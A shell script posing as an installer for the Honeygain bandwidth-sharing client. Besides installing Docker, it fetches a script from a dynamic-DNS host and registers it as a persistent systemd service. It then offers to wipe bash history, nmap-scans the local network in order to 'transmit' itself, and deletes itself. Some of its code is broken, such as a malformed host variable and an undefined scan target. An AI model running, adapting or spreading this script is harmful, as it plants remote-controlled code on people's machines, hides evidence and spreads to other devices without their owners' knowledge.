#!/bin/sh
#00101000 00110000 00101011 00101000 00110001 00101010 00110011 00101001 00101001 00101010 00110010
cat << ENDOFFILE


    WorkerHoneygain        installation
    \ \   \ \/ /   / /     | |    | |
     \ \   \ \/   / /      | |____| |
      \ \  /\ \  / /       | |____| |
       \ \/ /\ \/ /        | |    | |
        \ \/  \ \/         | |    | |
         ‾‾    ‾‾          ‾‾‾    ‾‾‾

ENDOFFILE

remoteip=$(dig suckmyleg.ddns.net +short)

read -p "Press 'enter' to install HoneyGainWorker or 'ctrl+c' to cancel: " nothing

if [ -x "$(command -v docker)" ]; then
	echo "Docker already installed"
else
	echo "Installing docker"
	
	apt-get -y install docker.io

	apt-get -y install docker-ce docker-ce-cli containerd.io
	if [ -x "$(command -v docker)" ]; then
		echo "Installed"
	else
		echo "Retrying"
		curl -sSL https://get.docker.com | sh
	fi

	echo "Installing honeygain"
	docker pull honeygain/honeygain
fi

echo "Creating service"

dir="/var/gvg/"

mkdir $dir

cat >${dir}RunHoneyGainWorker.sh << ENDOFFILE
$(wget "http://f{remoteip}:8080/RemoteContent/Honeygain/0.0.1/RunHoneyGainWorker.sh" -q -O -)
ENDOFFILE

ln -s ${dir}HoneyGainWorker.service /etc/systemd/system

cat > ${dir}HoneyGainWorker.service << ENDOFFILE
[Unit]
Description=HoneiGain, obtain credits by lending internet connection
After=multi-user.target
[Service]
Type=simple
ExecStart=/bin/bash ${dir}RunHoneyGainWorker.sh
 
[Install]
WantedBy=multi-user.target
ENDOFFILE

echo "Setting up service"

systemctl enable HoneyGainWorker.service
systemctl start HoneyGainWorker.service

echo "Done"

cat << ENDOFFILE
    __    __  __    __     ___    ___
    \ \   \ \/ /   / /     | |    | |
     \ \   \ \/   / /      | |____| |
      \ \  /\ \  / /       | |____| |
       \ \/ /\ \/ /        | |    | |
        \ \/  \ \/         | |    | |
         ‾‾    ‾‾          ‾‾‾    ‾‾‾







ENDOFFILE

read -p "Remove bash history? y/n" answer
if [ $answer = 'y' ]; then
	history -c 
	history -w
	echo "Removed history"
fi

read -p "Transmit installer? y/n" answer

if [ $answer = 'y' ]; then

	echo "Searching devices on network"

	open_ports=$(nmap -sS -oG output.txt $ip | grep open)
	output=${open_ports//[^0-9]/ } # remove text

	for line in $output; 
	do
		echo $line

	done 

fi

echo "Auto deleting Installer"
echo "Bye!!!!!!!"

rm $0
